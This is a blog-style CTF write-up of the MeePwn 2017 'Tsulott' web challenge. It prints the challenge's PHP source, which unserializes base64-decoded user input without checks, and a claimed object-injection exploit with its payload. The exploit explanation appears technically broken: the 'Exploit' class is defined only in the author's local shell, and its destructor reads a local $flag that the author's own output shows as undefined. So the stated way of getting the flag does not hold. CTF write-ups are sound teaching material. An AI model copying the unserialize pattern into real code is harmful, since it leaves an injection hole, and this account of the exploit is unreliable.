---
layout: post
title:  "Meepwn Tsulott"
date:	2017-09-28 14:19:38 +0200
author: foo
categories: ctf meepwn write-up
ref: meepwn-web
---

It's been a while since I last wrote something here, so maybe it's time to fix that...

---

**NOTE: If you want to try this challenge first by yourself,
[here](/assets/posts/2017-09-28-meepwn-web/code.tar.gz) are all the materials
needed to do it (note that you'll have to set up a server that supports PHP, as it won't
work otherwise).**

---

This is the write-up for the only challenge I completed on the
[MeePwn'17 CTF](https://ctftime.org/event/486). For some reason, the page kept telling me
to "stop spamming flags" while trying to submit the solution; so I simply gave up and
just got into something else.

Anyway, the first challenge I looked into was the one titled _Tsulott_. The webpage where
we have to get the flag from looks beautiful:

{% include image.html
	src="/assets/posts/2017-09-28-meepwn-web/first_recon.jpg"
	title="Webpage"
	alt="Webpage's first recon"
%}

The first thing to do is to look at the HTML, as most of this challenges are simple and,
usually, there are comments with clues. In this case, there's a comment at the end of the
file that makes us think that a debug option exists and someone forgot to disable it in
production:
```html
<center>
<font color='white'>-----------------------------------------------------------------------------------------------------------------------------</font>
<h3><font color='white'>Take code</font></h3><p>
<p><font color='white'>Pick your six numbers (Ex: 15 02 94 11 88 76)</font><p>
<form>
      <input type="text" name="gen_code" maxlength="17" /><p><p>
      <button type="submit" name="btn-submit" value="go">send</button>
</form>
</center>
<!-- GET is_debug=1 -->
</body>
```

Things like this can happen (not as obvious as this one, but still...), and we can take
advantage of someone's mistake by simply requesting `[endpoint]/?is_debug=1`. _Violà_,
here is the code of the server:

{% include image.html
	src="/assets/posts/2017-09-28-meepwn-web/code.jpg"
	title="Debug option set to 1"
	alt="Server's response when 'is_debug' is set to 1"
%}

Now we have to examine this new PHP code:

{% highlight php linenos %}
<?php
    class Object
    {
        var $jackpot;
        var $enter;
    }
?>


<?php

    include('secret.php');

    if (isset ($_GET ['input']))
    {
        $obj = unserialize (base64_decode ($_GET ['input']));

        if ($obj)
        {
            $obj->jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99);

            if ($obj->enter === $obj->jackpot)
            {
                echo "<center><strong><font color='white'>"
                    . "CONGRATULATION! You Won JACKPOT PriZe !!!"
                    . "</font></strong></center>"
                    . "<br><center><strong>"
                    . "<font color='white' size='20'>"
                    . $obj->jackpot
                    . "</font></strong></center>";

                echo "<br><center><strong><font color='green' size='25'>"
                    . $flag . "</font></strong></center><br>";

                echo "<center><img "
                    . "src='http://www.relatably.com/m/img/"
                    . "cross-memes/5378589.jpg' /></center>";
            }
            else
            {
                echo "<br><br><center><strong>"
                    . "<font color='white'>Wrong! True Six "
                    . "Numbers Are: </font></strong></center>"
                    . "<br><center><strong><font color='white'"
                    . " size='25'>"
                    . $obj->jackpot
                    . "</font></strong></center><br>";
            }
        }
        else
        {
            echo "<center><strong><font color='white'>- Something wrong,"
                . " do not hack us please! -</font></strong></center>";
        }
    }
    else
    {
        echo "";
    }
?>

<?php
    if (isset ($_GET ['gen_code']) && !empty ($_GET ['gen_code']))
    {
        $temp = new Object;
        $temp->enter = $_GET ['gen_code'];

        $code = base64_encode (serialize ($temp));

        echo '<center><font color=\'white\'>Here is your code,"
            . " please use it to Lott: <strong>'
            . $code. '</strong></font></center>';
    }
?>

<?php
    if (isset ($_GET ['is_debug']) && $_GET ['is_debug'] === '1')
    {
        show_source (__FILE__);
    }
?>
{% endhighlight %}



After a couple of minutes reading this code, we can see that there's a flaw on the way
the user input is handled, as it's not sanitized (on line 16). We can take advantage of
the unserialization to
[inject an object](https://www.owasp.org/index.php/PHP_Object_Injection), encoded in
base64 and passed using the parameter `input`.

This vulnerability works as follows:

  - We create a class, `Exploit`, that implements only one method: `__destruct ()`. This
	method will be called when the object is destroyed. The code inside it can be as
	simple as `var_dump ($flag);`.

  - An object, instance of the new class, is serialized and encoded in Base64. This will
	be the value of the parameter `input`.

  - The server recieves the Base64 encoded string and, after decoding it, calls the
	`unserialize ()` method. This method creates a new object with the information
	stored on this string. In this case, an instance of our new class is created and,
	upon its destruction, invokes the method `__destruct ()` that dumps the content
	of the flag.

Here's the exploit creation and the final result:
```php
$ php -a
Interactive mode enabled

php > class Exploit
php > {
php {	function __destruct ()
php {	{
php {		var_dump ($flag);
php {	}
php { }
php > echo base64_encode (serialize (new Exploit ()));
PHP Notice:  Undefined variable: flag in php shell code on line 5
NULL
Tzo3OiJFeHBsb2l0IjowOnt9
php >
```

When we request `/?input=Tzo3OiJFeHBsb2l0IjowOnt9`, we get the flag:


{% include image.html
	src="/assets/posts/2017-09-28-meepwn-web/flag.jpg"
	title="Exploit in action"
	alt="Server's response to the exploit, giving us the flag"
%}

Finnaly, the flag is `MeePwnCTF{__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___}`.

I wish I could've tried the rest of the challenges; but, unfortunately, the page didn't
let me submit the flags. Nevertheless, I had fun with this challenge and learned
something, so at least I left the CTF with a good impression.
